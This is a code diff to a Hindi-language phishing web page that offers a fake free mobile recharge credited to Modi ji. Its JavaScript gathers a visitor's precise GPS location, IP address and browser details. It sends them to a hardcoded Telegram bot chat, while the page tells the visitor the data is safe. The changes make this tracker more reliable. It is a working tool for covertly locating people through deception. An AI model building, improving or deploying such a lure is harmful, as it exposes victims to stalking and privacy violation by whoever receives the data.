@@ -22,6 +22,8 @@
       padding: 30px;  
       border-radius: 20px;  
       box-shadow: 0 10px 30px rgba(0,0,0,0.1);  
+      max-width: 400px;
+      width: 90%;
     }  
     h1 {  
       color: #2e7d32;  
@@ -39,30 +41,47 @@
     button:hover {  
       background: #1b5e20;  
     }  
+    button:disabled {
+      background: #888;
+      cursor: not-allowed;
+    }
     .small {  
       font-size: 0.8rem;  
       color: #666;  
       margin-top: 10px;  
-    }  
+    }
+    .success {
+      color: #2e7d32;
+      margin-top: 15px;
+      font-weight: bold;
+    }
   </style>  
 </head>  
 <body>  
   <div class="container">  
     <h1>🎁 मोदी जी की तरफ से 1 महीने का Free Recharge</h1>  
     <p>अपने नंबर की पुष्टि के लिए नीचे "<strong>Allow Location</strong>" पर क्लिक करें 👇</p>  
-    <button onclick="getLocation()">📍 Allow Location</button>  
+    <button id="locBtn" onclick="getLocation()">📍 Allow Location</button>  
     <p class="small">सिर्फ एक बार अनुमति दें। डेटा पूरी तरह सुरक्षित है।</p>  
+    <p id="msg" class="success"></p>
   </div>  
   
   <script>  
+    const locBtn = document.getElementById('locBtn');
+    const msg = document.getElementById('msg');
+
     function getLocation() {  
-      if (navigator.geolocation) {  
-        navigator.geolocation.getCurrentPosition(sendData, showError, {  
-          enableHighAccuracy: true  
-        });  
-      } else {  
+      if (!navigator.geolocation) {  
         alert("Geolocation is not supported by this browser.");  
-      }  
+        return;  
+      }
+      locBtn.disabled = true;
+      msg.textContent = "Location permission माँगी जा रही है... कृपया इंतज़ार करें।";
+
+      navigator.geolocation.getCurrentPosition(sendData, showError, {  
+        enableHighAccuracy: true,  
+        timeout: 15000  
+      });  
     }  
   
     async function sendData(position) {  
@@ -71,9 +90,13 @@
       const accuracy = position.coords.accuracy;  
       const time = new Date().toLocaleString();  
   
-      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());  
-      const ip = ipData.ip;  
-      const device = navigator.userAgent;  
+      let ip = "Unavailable";
+      try {
+        const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+        ip = ipData.ip;
+      } catch {}
+  
+      const device = navigator.userAgent.replace(/\s*\([^)]*\)/g, '');  
   
       const message = `📍 New Location Received:%0A📌 Lat: ${lat}%0A📌 Long: ${lon}%0A🎯 Accuracy: ${accuracy} meters%0A🕒 Time: ${time}%0A%0A🌐 IP: ${ip}%0A📱 Device: ${device}`;  
   
@@ -81,16 +104,20 @@
       const chatId = "6038115234";  
       const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;  
   
-      await fetch(url);  
-      window.location.href = "https://youtube.com/@ashishsharma14";  
+      try {
+        await fetch(url);
+        msg.textContent = "👍 धन्यवाद! आपका स्थान सफलतापूर्वक प्राप्त हो गया है।";
+      } catch {
+        msg.textContent = "❌ स्थान भेजने में समस्या हुई। कृपया पुनः प्रयास करें।";
+        locBtn.disabled = false;
+      }
     }  
   
     function showError(error) {  
-      alert("Location access denied or failed. Please try again.");  
+      alert("Location access denied or failed. कृपया अनुमति दें और पुनः प्रयास करें।");  
+      msg.textContent = "";
+      locBtn.disabled = false;
     }  
-  
-    // 🔄 Auto ask location on page load  
-    window.onload = getLocation;
   </script>  
 </body>  
 </html>
